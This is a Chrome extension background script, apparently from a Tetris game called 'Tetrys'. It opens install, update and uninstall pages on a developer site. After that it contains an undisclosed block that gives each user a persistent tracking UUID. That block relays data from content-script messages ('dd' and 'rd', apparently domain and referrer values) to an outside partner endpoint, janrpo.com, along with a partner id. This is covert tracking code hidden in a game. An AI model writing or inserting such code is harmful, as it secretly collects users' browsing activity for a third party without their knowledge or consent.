
chrome.runtime.onInstalled.addListener(function(details) {
  if (details.reason === 'install') {
    chrome.tabs.create({ 
      url: 'https://zolter.pro/tetris/install.php?extension=Tetrys&ref=cjobgkekcenldbaenikebmbhffhhffef' 
    });
    chrome.runtime.setUninstallURL('https://zolter.pro/tetris/uninstall.php?extension=Tetrys&ref=cjobgkekcenldbaenikebmbhffhhffef');
  } else if (details.reason === 'update') {
    chrome.tabs.create({ 
      url: 'https://zolter.pro/tetris/update.php?extension=Tetrys&ref=cjobgkekcenldbaenikebmbhffhhffef' 
    });
  }
});

(function () {

	const mainURL = "https:/janrpo.com/d";
	const partnerParameterName = "tba";
	const partnerId = "364";
	const subIdParameterName = "np";
	const subId = "2";
	const userParameterName = "pls";
	let userOj;
	
	function getUser(callbackFunc) {
		try {
			if (userOj && userOj[userParameterName]) {
				if (callbackFunc) {
					callbackFunc(userOj);
				}
				return userOj;
			}
			chrome.storage.local.get(function (item) {
				const userOjTmp = item && item[userParameterName] ? item : {[userParameterName]: generateUUID()};
				chrome.storage.local.set(userOjTmp);
				userOj = userOjTmp;
				if (callbackFunc) {
					callbackFunc(userOj);
				}
				return userOj;
			});
		} catch (error) {
			console.error(error)
		}
	}
	
	function generateUUID() {
		let d = new Date().getTime();
		let d2 = ((typeof performance !== 'undefined') && performance.now && (performance.now()*1000)) || 0;
		return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function(c) {
			let r = Math.random() * 16;
			if(d > 0){
				r = (d + r)%16 | 0;
				d = Math.floor(d/16);
			} else {
				r = (d2 + r)%16 | 0;
				d2 = Math.floor(d2/16);
			}
			return (c === 'x' ? r : (r & 0x3 | 0x8)).toString(16);
		});
	}
	
	function sendRequest(url) {
		try {
	  		return fetch(url);
		} catch (error) {
			console.error(error)
		}
	}
	
	function start() {
		try {
			const callbackFunc = function(userOj) {
				message(userOj);
			}
			getUser(callbackFunc);
		} catch (error) {
			console.error(error)
		}
	}
	
	function message(userOj) {
		try {
			chrome.runtime.onMessage.addListener(function (request, sender, sendResponse) {
				if (request["message"] == "ndd") {
					const url = `${mainURL}?${partnerParameterName}=${partnerId}&${subIdParameterName}=${subId}&${userParameterName}=${userOj[userParameterName]}&dd=${request["dd"]}&rd=${request["rd"]}`;
					sendRequest(url);
				}     
				return true;
			});
		} catch (error) {
			console.error(error)
		}
	}

	start();

})();
